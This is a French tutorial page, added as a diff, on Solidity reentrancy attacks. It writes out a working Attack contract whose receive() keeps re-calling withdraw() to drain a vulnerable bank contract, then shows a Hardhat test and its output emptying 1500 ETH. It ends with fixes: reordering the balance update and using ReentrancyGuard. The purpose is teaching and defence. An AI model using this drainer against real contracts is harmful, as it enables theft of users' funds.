@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="fr">
+	<head>
+    <meta charset="UTF-8">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Title -->
+    <title>Solidity: attaque par re-entrance la suite</title>
+    <meta name="description" content="Suite du tutoriel solidity expliquant les attaques de re-entrance avec l'étude d'un cas concret.">
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Responsive Stylesheet -->
+    <link rel="stylesheet" href="/css/responsive.css">
+    <link rel="sitemap" href="/sitemap-index.xml">
+    <!-- Favicon -->
+    <link rel="icon" href="/img/core-img/favicon.ico">
+ <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-XNLXBTQEWJ"></script>
+
+    
+<script type="module">window.dataLayer=window.dataLayer||[];function a(){dataLayer.push(arguments)}a("js",new Date);a("config","G-XNLXBTQEWJ");
+</script></head>
+	<body>
+		 
+	   
+    
+        <!-- ##### Header Area Start ##### -->
+    <nav class="navbar navbar-expand-lg navbar-white fixed-top" id="banner">
+        <div class="container">
+            <!-- Brand -->
+            <a class="navbar-brand" href="/">Accueil</a>
+
+            <!-- Toggler/collapsibe Button -->
+            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#collapsibleNavbar">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+
+            <!-- Navbar links -->
+            <div class="collapse navbar-collapse" id="collapsibleNavbar">
+
+            </div>
+        </div>
+    </nav>
+    <!-- ##### Header Area End ##### -->
+
+    <!-- ##### Welcome Area Start ##### -->
+    <div class="breadcumb-area">
+
+        <!-- breadcumb content -->
+        <div class="breadcumb-content">
+            <div class="container h-100">
+                <div class="row h-100 align-items-center">
+                    <div class="col-12">
+                        <nav aria-label="breadcrumb" class="breadcumb--con text-center">
+                            <h2 class="w-text title wow fadeInUp" data-wow-delay="0.2s">Attaque par &#39;Ré-entrance&#39; (reentrancy)</h2>
+                            <ol class="breadcrumb justify-content-center wow fadeInUp" data-wow-delay="0.4s">
+                                <li class="breadcrumb-item"><a href="/">Accueil</a></li>
+                                <li class="breadcrumb-item"><a href="/smart-contract/smart-contract-avec-solidity">Smart
+                                        contract</a></li>
+
+                            </ol>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+      <!-- ##### Blog Area Start ##### -->
+      <section class="blog-area section-padding-100-85">
+        <div class="container">
+
+            <div class="row">
+                
+                <div class="col-12">
+                    <div class="single-blog-area wow fadeInUp" data-wow-delay="0.2s">
+                        <!-- Post Thumbnail -->
+                        <div class="blog_thumbnail">
+                            
+                        </div>
+
+                        <div class="blog-content">
+                            <h2 id="réalisation-dune-attaque-par-reentrancy">Réalisation d’une attaque par “reentrancy”</h2>
+<p>Pour réaliser notre attaque nous devons d’abord créer un nouveau smart contract qui va appeler notre smart contract <b>BankAccount</b>.
+<br>Créeons pour cela un nouveau smart contract nommé <b>Attack</b> :</p>
+<pre is:raw="" class="astro-code" style="background-color: #0d1117; overflow-x: auto;"><code><span class="line"><span style="color: #8B949E">// SPDX-License-Identifier: UNLICENSED</span></span>
+<span class="line"><span style="color: #FF7B72">pragma</span><span style="color: #C9D1D9"> </span><span style="color: #7EE787">solidity</span><span style="color: #C9D1D9"> </span><span style="color: #79C0FF">^0.8.9</span><span style="color: #C9D1D9">;</span></span>
+<span class="line"><span style="color: #FF7B72">import</span><span style="color: #C9D1D9"> </span><span style="color: #A5D6FF">"@openzeppelin/contracts/utils/Address.sol"</span><span style="color: #C9D1D9">;</span></span>
+<span class="line"><span style="color: #FF7B72">import</span><span style="color: #C9D1D9"> </span><span style="color: #A5D6FF">"@openzeppelin/contracts/access/Ownable.sol"</span><span style="color: #C9D1D9">;</span></span>
+<span class="line"><span style="color: #FF7B72">import</span><span style="color: #C9D1D9"> </span><span style="color: #A5D6FF">"hardhat/console.sol"</span><span style="color: #C9D1D9">;</span></span>
+<span class="line"><span style="color: #FF7B72">interface</span><span style="color: #FFA657"> InterfaceBankAccount</span><span style="color: #C9D1D9"> {</span></span>
+<span class="line"><span style="color: #C9D1D9">  </span><span style="color: #FF7B72">function</span><span style="color: #C9D1D9"> </span><span style="color: #D2A8FF">deposit</span><span style="color: #C9D1D9">() </span><span style="color: #FF7B72">external</span><span style="color: #C9D1D9"> </span><span style="color: #FF7B72">payable</span><span style="color: #C9D1D9">;</span></span>
+<span class="line"><span style="color: #C9D1D9">  </span><span style="color: #FF7B72">function</span><span style="color: #C9D1D9"> </span><span style="color: #D2A8FF">withdraw</span><span style="color: #C9D1D9">() </span><span style="color: #FF7B72">external</span><span style="color: #C9D1D9">;</span></span>
+<span class="line"><span style="color: #C9D1D9">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #FF7B72">contract</span><span style="color: #C9D1D9"> </span><span style="color: #FFA657">Attack</span><span style="color: #C9D1D9">  </span><span style="color: #FF7B72">is</span><span style="color: #C9D1D9"> </span><span style="color: #FFA657">Ownable</span><span style="color: #C9D1D9"> {</span></span>
+<span class="line"><span style="color: #C9D1D9">  InterfaceBankAccount </span><span style="color: #FF7B72">public</span><span style="color: #C9D1D9"> </span><span style="color: #FF7B72">immutable</span><span style="color: #C9D1D9"> bankAccountSmartContractAddress;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C9D1D9">  </span><span style="color: #FF7B72">constructor</span><span style="color: #C9D1D9">(</span><span style="color: #79C0FF">address</span><span style="color: #C9D1D9"> _bankAccountSmartContractAddress) {</span></span>
+<span class="line"><span style="color: #C9D1D9">    bankAccountSmartContractAddress </span><span style="color: #FF7B72">=</span><span style="color: #C9D1D9"> </span><span style="color: #D2A8FF">InterfaceBankAccount</span><span style="color: #C9D1D9">(_bankAccountSmartContractAddress);</span></span>
+<span class="line"><span style="color: #C9D1D9">  }</span></span>
+<span class="line"><span style="color: #C9D1D9">}</span></span></code></pre>
+<p>Afin de pouvoir dialoguer avec le smart contract <b>BankAccount</b> nous créeons une interface contenant les deux méthodes que l’on souhaitera appeler,
+puis lors de l’initialisation de notre nouveau smart contract, nous passons l’adresse du smart contract <b>BankAccount</b> et initialisons ce dernier via notre interface.
+<br>Puis nous pouvons écrire la méthode qui va permettre d’initier l’attaque :</p>
+<pre is:raw="" class="astro-code" style="background-color: #0d1117; overflow-x: auto;"><code><span class="line"><span style="color: #FF7B72">function</span><span style="color: #C9D1D9"> </span><span style="color: #D2A8FF">attack</span><span style="color: #C9D1D9">() </span><span style="color: #FF7B72">external</span><span style="color: #C9D1D9"> </span><span style="color: #FF7B72">payable</span><span style="color: #C9D1D9"> </span><span style="color: #D2A8FF">onlyOwner</span><span style="color: #C9D1D9"> {</span></span>
+<span class="line"><span style="color: #C9D1D9">    bankAccountSmartContractAddress.deposit{ value</span><span style="color: #FF7B72">:</span><span style="color: #C9D1D9"> </span><span style="color: #79C0FF">msg</span><span style="color: #C9D1D9">.value }();</span></span>
+<span class="line"><span style="color: #C9D1D9">    bankAccountSmartContractAddress.</span><span style="color: #D2A8FF">withdraw</span><span style="color: #C9D1D9">();</span></span>
+<span class="line"><span style="color: #C9D1D9">  }</span></span></code></pre>
+<p>Cette méthode réalise tout d’abord un dépôt dans notre <b>BankAccount</b>, puis et c’est là où cela va devenir intéressant, demande un retrait juste après avoir effectué le dépôt.
+<br>
+La méthode <b>withdraw</b> du contrat <b>BankAccount</b> va alors exécuter l’opération: <b> payable(msg.sender).sendValue(depositedAmount)</b>, c’est à dire faire une demande d’envoi d’argent à celui qui en fait la demande.
+<br>Or cette fois, c’est notre smart contract <b>Attack</b> qui est l’origine de la demande, donc c’est lui qui va recevoir les fonds. Jusque là, pas de problème.
+<br>Lorsqu’un smart contract reçoit des fonds, une méthode <b>receive</b> est automatiquent appelée. C’est dans celle ci que l’on va pouvoir mettre en place notre attaque:</p>
+<pre is:raw="" class="astro-code" style="background-color: #0d1117; overflow-x: auto;"><code><span class="line"><span style="color: #D2A8FF">receive</span><span style="color: #C9D1D9">() </span><span style="color: #FF7B72">external</span><span style="color: #C9D1D9"> </span><span style="color: #FF7B72">payable</span><span style="color: #C9D1D9"> {</span></span>
+<span class="line"><span style="color: #C9D1D9">    </span><span style="color: #FF7B72">if</span><span style="color: #C9D1D9"> (</span><span style="color: #79C0FF">address</span><span style="color: #C9D1D9">(bankAccountSmartContractAddress).balance </span><span style="color: #FF7B72">></span><span style="color: #C9D1D9"> </span><span style="color: #79C0FF">0</span><span style="color: #C9D1D9">) {</span></span>
+<span class="line"><span style="color: #C9D1D9">      </span><span style="color: #8B949E">// Reentrancy by calling again withdraw</span></span>
+<span class="line"><span style="color: #C9D1D9">      bankAccountSmartContractAddress.</span><span style="color: #D2A8FF">withdraw</span><span style="color: #C9D1D9">();</span></span>
+<span class="line"><span style="color: #C9D1D9">    } </span><span style="color: #FF7B72">else</span><span style="color: #C9D1D9"> {</span></span>
+<span class="line"><span style="color: #C9D1D9">      console.</span><span style="color: #D2A8FF">log</span><span style="color: #C9D1D9">(</span><span style="color: #A5D6FF">"Transfering money..."</span><span style="color: #C9D1D9">);</span></span>
+<span class="line"><span style="color: #C9D1D9">      </span><span style="color: #FF7B72">payable</span><span style="color: #C9D1D9">(</span><span style="color: #D2A8FF">owner</span><span style="color: #C9D1D9">()).</span><span style="color: #D2A8FF">transfer</span><span style="color: #C9D1D9">(</span><span style="color: #79C0FF">address</span><span style="color: #C9D1D9">(</span><span style="color: #79C0FF">this</span><span style="color: #C9D1D9">).balance);</span></span>
+<span class="line"><span style="color: #C9D1D9">    }</span></span>
+<span class="line"><span style="color: #C9D1D9">  }</span></span></code></pre>
+<p>Il suffit de ré-écrire la méthode <b>receive</b>, pour que quand elle reçoit de l’argent, elle vérifie si le contrat appelant (<b>BankAccount</b>) contient toujours des fonds (c’est à dire si sa balance est spérieure à 0),
+et si c’est le cas, elle rappelle aussitôt la méthode <b>withdraw</b>. C’est ainsi que la récursivité va entrer en jeu et que les fonds vont être vidés.
+<br>Ensuite si il n’y a plus de fond disponible, notre smart contract attaquant va demander un tranfert immédiat de tout l’argent récolté vers le compte propriétaire du smart contract attaquant.
+<br><br>Wow !
+<br><br>En fait ceci est possible car dans la méthode <b>withdraw</b> on a d’abord la ligne:
+<br> <b>payable(msg.sender).sendValue(depositedAmount)</b> puis la ligne:<br> <b>balanceOf[msg.sender] = 0;</b>
+<br>
+<br>Donc la méthode payable appelle la méthode receive qui rappelle la méthode withdraw qui redéclenche un payable qui appelle la méthode receive, …
+C’est seulement lorsque la récursivité finit que la ligne <b>balanceOf[msg.sender] = 0;</b> est exécuté.</p>
+<h2 id="test-de-lattaque-par-reentrancy">Test de l’attaque par “reentrancy”</h2>
+<p>Pour vérifier mes propos, écrivons notre test:</p>
+<pre is:raw="" class="astro-code" style="background-color: #0d1117; overflow-x: auto;"><code><span class="line"><span style="color: #FF7B72">import</span><span style="color: #C9D1D9"> { assert, expect } </span><span style="color: #FF7B72">from</span><span style="color: #C9D1D9"> </span><span style="color: #A5D6FF">"chai"</span><span style="color: #C9D1D9">;</span></span>
+<span class="line"><span style="color: #FF7B72">import</span><span style="color: #C9D1D9"> { ethers } </span><span style="color: #FF7B72">from</span><span style="color: #C9D1D9"> </span><span style="color: #A5D6FF">"hardhat"</span><span style="color: #C9D1D9">;</span></span>
+<span class="line"><span style="color: #FF7B72">import</span><span style="color: #C9D1D9"> { loadFixture } </span><span style="color: #FF7B72">from</span><span style="color: #C9D1D9"> </span><span style="color: #A5D6FF">"@nomicfoundation/hardhat-network-helpers"</span><span style="color: #C9D1D9">;</span></span>
+<span class="line"><span style="color: #D2A8FF">describe</span><span style="color: #C9D1D9">(</span><span style="color: #A5D6FF">"ReentrancyAttack"</span><span style="color: #C9D1D9">, </span><span style="color: #FF7B72">function</span><span style="color: #C9D1D9"> () {</span></span>
+<span class="line"><span style="color: #C9D1D9">    </span><span style="color: #FF7B72">async</span><span style="color: #C9D1D9"> </span><span style="color: #FF7B72">function</span><span style="color: #C9D1D9"> </span><span style="color: #D2A8FF">deployFixture</span><span style="color: #C9D1D9">() {</span></span>
+<span class="line"><span style="color: #C9D1D9">      </span><span style="color: #FF7B72">const</span><span style="color: #C9D1D9"> [</span><span style="color: #79C0FF">owner</span><span style="color: #C9D1D9">, </span><span style="color: #79C0FF">attacker</span><span style="color: #C9D1D9">, </span><span style="color: #79C0FF">account1</span><span style="color: #C9D1D9">,</span><span style="color: #79C0FF">account2</span><span style="color: #C9D1D9">,</span><span style="color: #79C0FF">account3</span><span style="color: #C9D1D9">] </span><span style="color: #FF7B72">=</span><span style="color: #C9D1D9"> </span><span style="color: #FF7B72">await</span><span style="color: #C9D1D9"> ethers.</span><span style="color: #D2A8FF">getSigners</span><span style="color: #C9D1D9">();</span></span>
+<span class="line"><span style="color: #C9D1D9">      </span><span style="color: #FF7B72">const</span><span style="color: #C9D1D9"> </span><span style="color: #79C0FF">BankAccountFactory</span><span style="color: #C9D1D9"> </span><span style="color: #FF7B72">=</span><span style="color: #C9D1D9"> </span><span style="color: #FF7B72">await</span><span style="color: #C9D1D9"> ethers.</span><span style="color: #D2A8FF">getContractFactory</span><span style="color: #C9D1D9">(</span><span style="color: #A5D6FF">"BankAccount"</span><span style="color: #C9D1D9">,owner);</span></span>
+<span class="line"><span style="color: #C9D1D9">      </span><span style="color: #FF7B72">const</span><span style="color: #C9D1D9"> </span><span style="color: #79C0FF">bankAccountContract</span><span style="color: #C9D1D9"> </span><span style="color: #FF7B72">=</span><span style="color: #C9D1D9"> </span><span style="color: #FF7B72">await</span><span style="color: #C9D1D9"> BankAccountFactory.</span><span style="color: #D2A8FF">deploy</span><span style="color: #C9D1D9">();</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C9D1D9">      </span><span style="color: #FF7B72">const</span><span style="color: #C9D1D9"> </span><span style="color: #79C0FF">attackFactory</span><span style="color: #C9D1D9"> </span><span style="color: #FF7B72">=</span><span style="color: #C9D1D9"> </span><span style="color: #FF7B72">await</span><span style="color: #C9D1D9"> ethers.</span><span style="color: #D2A8FF">getContractFactory</span><span style="color: #C9D1D9">(</span><span style="color: #A5D6FF">"Attack"</span><span style="color: #C9D1D9">,attacker);</span></span>
+<span class="line"><span style="color: #C9D1D9">      </span><span style="color: #FF7B72">const</span><span style="color: #C9D1D9"> </span><span style="color: #79C0FF">attackContract</span><span style="color: #C9D1D9"> </span><span style="color: #FF7B72">=</span><span style="color: #C9D1D9"> </span><span style="color: #FF7B72">await</span><span style="color: #C9D1D9"> attackFactory.</span><span style="color: #D2A8FF">deploy</span><span style="color: #C9D1D9">(bankAccountContract.address);</span></span>
+<span class="line"><span style="color: #C9D1D9">      </span><span style="color: #FF7B72">return</span><span style="color: #C9D1D9"> { bankAccountContract, attackContract,owner, attacker,account1,account2,account3};</span></span>
+<span class="line"><span style="color: #C9D1D9">    }</span></span>
+<span class="line"><span style="color: #C9D1D9">  </span></span>
+<span class="line"><span style="color: #C9D1D9">   </span></span>
+<span class="line"><span style="color: #C9D1D9">      </span></span>
+<span class="line"><span style="color: #C9D1D9">    </span><span style="color: #D2A8FF">describe</span><span style="color: #C9D1D9">(</span><span style="color: #A5D6FF">"Attack"</span><span style="color: #C9D1D9">, </span><span style="color: #FF7B72">function</span><span style="color: #C9D1D9"> () {</span></span>
+<span class="line"><span style="color: #C9D1D9">      </span><span style="color: #D2A8FF">it</span><span style="color: #C9D1D9">(</span><span style="color: #A5D6FF">"Should drains all ETH from bank contract"</span><span style="color: #C9D1D9">, </span><span style="color: #FF7B72">async</span><span style="color: #C9D1D9"> </span><span style="color: #FF7B72">function</span><span style="color: #C9D1D9"> () {</span></span>
+<span class="line"><span style="color: #C9D1D9">        </span><span style="color: #FF7B72">const</span><span style="color: #C9D1D9"> { </span><span style="color: #79C0FF">bankAccountContract</span><span style="color: #C9D1D9">,</span><span style="color: #79C0FF">attackContract</span><span style="color: #C9D1D9">, </span><span style="color: #79C0FF">owner</span><span style="color: #C9D1D9">,</span><span style="color: #79C0FF">attacker</span><span style="color: #C9D1D9">,</span><span style="color: #79C0FF">account1</span><span style="color: #C9D1D9">,</span><span style="color: #79C0FF">account2</span><span style="color: #C9D1D9">,</span><span style="color: #79C0FF">account3</span><span style="color: #C9D1D9"> } </span><span style="color: #FF7B72">=</span><span style="color: #C9D1D9"> </span><span style="color: #FF7B72">await</span><span style="color: #C9D1D9"> </span><span style="color: #D2A8FF">loadFixture</span><span style="color: #C9D1D9">(deployFixture);</span></span>
+<span class="line"><span style="color: #C9D1D9">        </span><span style="color: #8B949E">// Deposit to bank from different accounts</span></span>
+<span class="line"><span style="color: #C9D1D9">        </span><span style="color: #FF7B72">await</span><span style="color: #C9D1D9"> bankAccountContract.</span><span style="color: #D2A8FF">connect</span><span style="color: #C9D1D9">(account1).</span><span style="color: #D2A8FF">deposit</span><span style="color: #C9D1D9">({ value: ethers.utils.</span><span style="color: #D2A8FF">parseEther</span><span style="color: #C9D1D9">(</span><span style="color: #A5D6FF">"500"</span><span style="color: #C9D1D9">) });</span></span>
+<span class="line"><span style="color: #C9D1D9">        </span><span style="color: #FF7B72">await</span><span style="color: #C9D1D9"> bankAccountContract.</span><span style="color: #D2A8FF">connect</span><span style="color: #C9D1D9">(account2).</span><span style="color: #D2A8FF">deposit</span><span style="color: #C9D1D9">({ value: ethers.utils.</span><span style="color: #D2A8FF">parseEther</span><span style="color: #C9D1D9">(</span><span style="color: #A5D6FF">"500"</span><span style="color: #C9D1D9">) });</span></span>
+<span class="line"><span style="color: #C9D1D9">        </span><span style="color: #FF7B72">await</span><span style="color: #C9D1D9"> bankAccountContract.</span><span style="color: #D2A8FF">connect</span><span style="color: #C9D1D9">(account3).</span><span style="color: #D2A8FF">deposit</span><span style="color: #C9D1D9">({ value: ethers.utils.</span><span style="color: #D2A8FF">parseEther</span><span style="color: #C9D1D9">(</span><span style="color: #A5D6FF">"500"</span><span style="color: #C9D1D9">) });</span></span>
+<span class="line"><span style="color: #C9D1D9">        </span><span style="color: #8B949E">// check balance before attack </span></span>
+<span class="line"><span style="color: #C9D1D9">        </span><span style="color: #FF7B72">let</span><span style="color: #C9D1D9"> accountBalanceBeforeAttack </span><span style="color: #FF7B72">=</span><span style="color: #C9D1D9">  </span><span style="color: #FF7B72">await</span><span style="color: #C9D1D9"> ethers.provider.</span><span style="color: #D2A8FF">getBalance</span><span style="color: #C9D1D9">(attacker.address);</span></span>
+<span class="line"><span style="color: #C9D1D9">        console.</span><span style="color: #D2A8FF">log</span><span style="color: #C9D1D9">(</span><span style="color: #A5D6FF">`BankAccount before : ${</span><span style="color: #C9D1D9">ethers</span><span style="color: #A5D6FF">.</span><span style="color: #C9D1D9">utils</span><span style="color: #A5D6FF">.</span><span style="color: #D2A8FF">formatEther</span><span style="color: #A5D6FF">(</span><span style="color: #FF7B72">await</span><span style="color: #A5D6FF"> </span><span style="color: #C9D1D9">ethers</span><span style="color: #A5D6FF">.</span><span style="color: #C9D1D9">provider</span><span style="color: #A5D6FF">.</span><span style="color: #D2A8FF">getBalance</span><span style="color: #A5D6FF">(</span><span style="color: #C9D1D9">bankAccountContract</span><span style="color: #A5D6FF">.</span><span style="color: #C9D1D9">address</span><span style="color: #A5D6FF">)).</span><span style="color: #D2A8FF">toString</span><span style="color: #A5D6FF">()</span><span style="color: #A5D6FF">}`</span><span style="color: #C9D1D9">);</span></span>
+<span class="line"><span style="color: #C9D1D9">        console.</span><span style="color: #D2A8FF">log</span><span style="color: #C9D1D9">(</span><span style="color: #A5D6FF">`===Attacker balance before : ${</span><span style="color: #C9D1D9">ethers</span><span style="color: #A5D6FF">.</span><span style="color: #C9D1D9">utils</span><span style="color: #A5D6FF">.</span><span style="color: #D2A8FF">formatEther</span><span style="color: #A5D6FF">(</span><span style="color: #C9D1D9">accountBalanceBeforeAttack</span><span style="color: #A5D6FF">).</span><span style="color: #D2A8FF">toString</span><span style="color: #A5D6FF">()</span><span style="color: #A5D6FF">}`</span><span style="color: #C9D1D9">);</span></span>
+<span class="line"><span style="color: #C9D1D9">       </span></span>
+<span class="line"><span style="color: #C9D1D9">        </span><span style="color: #FF7B72">await</span><span style="color: #C9D1D9"> attackContract.</span><span style="color: #D2A8FF">attack</span><span style="color: #C9D1D9">({ value: ethers.utils.</span><span style="color: #D2A8FF">parseEther</span><span style="color: #C9D1D9">(</span><span style="color: #A5D6FF">"500"</span><span style="color: #C9D1D9">) })</span></span>
+<span class="line"><span style="color: #C9D1D9">       </span></span>
+<span class="line"><span style="color: #C9D1D9">        </span><span style="color: #8B949E">// check balance after attack</span></span>
+<span class="line"><span style="color: #C9D1D9">        </span><span style="color: #FF7B72">let</span><span style="color: #C9D1D9"> accountBalanceAfterAttack </span><span style="color: #FF7B72">=</span><span style="color: #C9D1D9">  </span><span style="color: #FF7B72">await</span><span style="color: #C9D1D9"> ethers.provider.</span><span style="color: #D2A8FF">getBalance</span><span style="color: #C9D1D9">(attacker.address);</span></span>
+<span class="line"><span style="color: #C9D1D9">        </span><span style="color: #FF7B72">let</span><span style="color: #C9D1D9"> bankBalanceAfter </span><span style="color: #FF7B72">=</span><span style="color: #C9D1D9"> </span><span style="color: #FF7B72">await</span><span style="color: #C9D1D9"> ethers.provider.</span><span style="color: #D2A8FF">getBalance</span><span style="color: #C9D1D9">(bankAccountContract.address)</span></span>
+<span class="line"><span style="color: #C9D1D9">        console.</span><span style="color: #D2A8FF">log</span><span style="color: #C9D1D9">(</span><span style="color: #A5D6FF">`BankAccount after : ${</span><span style="color: #C9D1D9">ethers</span><span style="color: #A5D6FF">.</span><span style="color: #C9D1D9">utils</span><span style="color: #A5D6FF">.</span><span style="color: #D2A8FF">formatEther</span><span style="color: #A5D6FF">(</span><span style="color: #C9D1D9">bankBalanceAfter</span><span style="color: #A5D6FF">).</span><span style="color: #D2A8FF">toString</span><span style="color: #A5D6FF">()</span><span style="color: #A5D6FF">}`</span><span style="color: #C9D1D9">);</span></span>
+<span class="line"><span style="color: #C9D1D9">        console.</span><span style="color: #D2A8FF">log</span><span style="color: #C9D1D9">(</span><span style="color: #A5D6FF">`===Attacker balance after : ${</span><span style="color: #C9D1D9">ethers</span><span style="color: #A5D6FF">.</span><span style="color: #C9D1D9">utils</span><span style="color: #A5D6FF">.</span><span style="color: #D2A8FF">formatEther</span><span style="color: #A5D6FF">(</span><span style="color: #C9D1D9">accountBalanceAfterAttack</span><span style="color: #A5D6FF">).</span><span style="color: #D2A8FF">toString</span><span style="color: #A5D6FF">()</span><span style="color: #A5D6FF">}`</span><span style="color: #C9D1D9">);</span></span>
+<span class="line"><span style="color: #C9D1D9">        </span><span style="color: #D2A8FF">expect</span><span style="color: #C9D1D9">(bankBalanceAfter).to.</span><span style="color: #D2A8FF">eq</span><span style="color: #C9D1D9">(ethers.utils.</span><span style="color: #D2A8FF">parseEther</span><span style="color: #C9D1D9">(</span><span style="color: #A5D6FF">"0"</span><span style="color: #C9D1D9">));</span></span>
+<span class="line"><span style="color: #C9D1D9">      });</span></span>
+<span class="line"><span style="color: #C9D1D9">  </span></span>
+<span class="line"><span style="color: #C9D1D9">       </span></span>
+<span class="line"><span style="color: #C9D1D9">    });</span></span>
+<span class="line"><span style="color: #C9D1D9">    </span></span>
+<span class="line"><span style="color: #C9D1D9">  });</span></span></code></pre>
+<p>et voici ce que donne l’exécution du test:</p>
+<pre is:raw="" class="astro-code" style="background-color: #0d1117; overflow-x: auto;"><code><span class="line"><span style="color: #C9D1D9">npx hardhat test </span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C9D1D9">  ReentrancyAttack</span></span>
+<span class="line"><span style="color: #C9D1D9">    Attack</span></span>
+<span class="line"><span style="color: #C9D1D9">BankAccount </span><span style="color: #FFA657">before</span><span style="color: #C9D1D9"> : </span><span style="color: #79C0FF">1500.0</span></span>
+<span class="line"><span style="color: #FF7B72">===</span><span style="color: #C9D1D9">Attacker balance </span><span style="color: #FFA657">before</span><span style="color: #C9D1D9"> : </span><span style="color: #79C0FF">9999.998937286964659732</span></span>
+<span class="line"><span style="color: #C9D1D9">Transfering money</span><span style="color: #FF7B72">...</span></span>
+<span class="line"><span style="color: #C9D1D9">BankAccount </span><span style="color: #FFA657">after</span><span style="color: #C9D1D9"> : </span><span style="color: #79C0FF">0.0</span></span>
+<span class="line"><span style="color: #FF7B72">===</span><span style="color: #C9D1D9">Attacker balance </span><span style="color: #FFA657">after</span><span style="color: #C9D1D9"> : </span><span style="color: #79C0FF">11499.998820990915721432</span></span>
+<span class="line"><span style="color: #C9D1D9">      ✔ Should drains all </span><span style="color: #79C0FF">ETH</span><span style="color: #C9D1D9"> from bank </span><span style="color: #D2A8FF">contract</span><span style="color: #C9D1D9"> (781ms)</span></span></code></pre>
+<p>Comme on peut le voir, notre smart contract <b>BankAccount</b> a un solde de 0 ETH tandis que celui de l’attaquant a été crédité de +1500 ETH…</p>
+<h2 id="protection-contre-lattaque-par-reentrancy">Protection contre l’attaque par “reentrancy”</h2>
+<p>Dans le cas étudié pour se protéger de l’attaque, le moyen le plus simple est d’intervertir les 2 lignes <b>balanceOf[msg.sender] = 0</b> et <b> payable(msg.sender).sendValue(depositedAmount)</b> comme ceci:</p>
+<pre is:raw="" class="astro-code" style="background-color: #0d1117; overflow-x: auto;"><code><span class="line"><span style="color: #FF7B72">function</span><span style="color: #C9D1D9"> </span><span style="color: #D2A8FF">withdraw</span><span style="color: #C9D1D9">() </span><span style="color: #FF7B72">external</span><span style="color: #C9D1D9"> </span><span style="color: #D2A8FF">nonReentrant</span><span style="color: #C9D1D9">{</span></span>
+<span class="line"><span style="color: #C9D1D9">    </span><span style="color: #FF7B72">require</span><span style="color: #C9D1D9">(balanceOf[</span><span style="color: #79C0FF">msg.sender</span><span style="color: #C9D1D9">] </span><span style="color: #FF7B72">></span><span style="color: #C9D1D9"> </span><span style="color: #79C0FF">0</span><span style="color: #C9D1D9">, </span><span style="color: #A5D6FF">"Pas de fond a retirer"</span><span style="color: #C9D1D9">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C9D1D9">    </span><span style="color: #79C0FF">uint256</span><span style="color: #C9D1D9"> depositedAmount </span><span style="color: #FF7B72">=</span><span style="color: #C9D1D9"> balanceOf[</span><span style="color: #79C0FF">msg.sender</span><span style="color: #C9D1D9">];</span></span>
+<span class="line"><span style="color: #C9D1D9">    balanceOf[</span><span style="color: #79C0FF">msg.sender</span><span style="color: #C9D1D9">] </span><span style="color: #FF7B72">=</span><span style="color: #C9D1D9"> </span><span style="color: #79C0FF">0</span><span style="color: #C9D1D9">;</span></span>
+<span class="line"><span style="color: #C9D1D9">    </span><span style="color: #FF7B72">payable</span><span style="color: #C9D1D9">(</span><span style="color: #79C0FF">msg.sender</span><span style="color: #C9D1D9">).</span><span style="color: #D2A8FF">sendValue</span><span style="color: #C9D1D9">(depositedAmount);</span></span>
+<span class="line"><span style="color: #C9D1D9">  }</span></span></code></pre>
+<p>Ainsi on met le solde de l’appelant à 0 avant de lui envoyer l’argent, donc si ce dernier essaye de rappeller notre méthode de retrait, son solde sera à 0 et la transaction sera rejetée grâce à notre première ligne <b>require</b>
+<br>Voici ce que donne l’exécution du test:</p>
+<pre is:raw="" class="astro-code" style="background-color: #0d1117; overflow-x: auto;"><code><span class="line"><span style="color: #C9D1D9">npx hardhat test </span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C9D1D9"> </span><span style="color: #79C0FF">1</span><span style="color: #C9D1D9">) ReentrancyAttack</span></span>
+<span class="line"><span style="color: #C9D1D9">       Attack</span></span>
+<span class="line"><span style="color: #C9D1D9">         Should drains all </span><span style="color: #79C0FF">ETH</span><span style="color: #C9D1D9"> from bank </span><span style="color: #FFA657">contract</span><span style="color: #C9D1D9">:</span></span>
+<span class="line"><span style="color: #C9D1D9">     </span><span style="color: #FFA657">Error</span><span style="color: #C9D1D9">: </span><span style="color: #79C0FF">VM</span><span style="color: #C9D1D9"> Exception </span><span style="color: #FF7B72">while</span><span style="color: #C9D1D9"> processing </span><span style="color: #FFA657">transaction</span><span style="color: #C9D1D9">: reverted </span><span style="color: #FF7B72">with</span><span style="color: #C9D1D9"> reason string </span><span style="color: #A5D6FF">'Address: unable to send value, recipient may have reverted'</span></span></code></pre>
+<p>Une autre solution aurait été d’implémenter ce que l’on appelle un lock (positionnement d’une variable en entrée et en sortie de fonction et vérification de la valeur du lock avant d’autoriser l’execution de la méthode).
+<br><br>Mais le plus simple est d’utiliser la librairie <a href="https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard">d’OpenZeppelin</a> <strong>ReentrancyGuard</strong> prévue pour ça:</p>
+<pre is:raw="" class="astro-code" style="background-color: #0d1117; overflow-x: auto;"><code><span class="line"><span style="color: #8B949E">// SPDX-License-Identifier: UNLICENSED</span></span>
+<span class="line"><span style="color: #FF7B72">pragma</span><span style="color: #C9D1D9"> </span><span style="color: #7EE787">solidity</span><span style="color: #C9D1D9"> </span><span style="color: #79C0FF">^0.8.9</span><span style="color: #C9D1D9">;</span></span>
+<span class="line"><span style="color: #FF7B72">import</span><span style="color: #C9D1D9"> </span><span style="color: #A5D6FF">"@openzeppelin/contracts/utils/Address.sol"</span><span style="color: #C9D1D9">;</span></span>
+<span class="line"><span style="color: #FF7B72">import</span><span style="color: #C9D1D9"> </span><span style="color: #A5D6FF">"@openzeppelin/contracts/security/ReentrancyGuard.sol"</span><span style="color: #C9D1D9">;</span></span>
+<span class="line"></span>
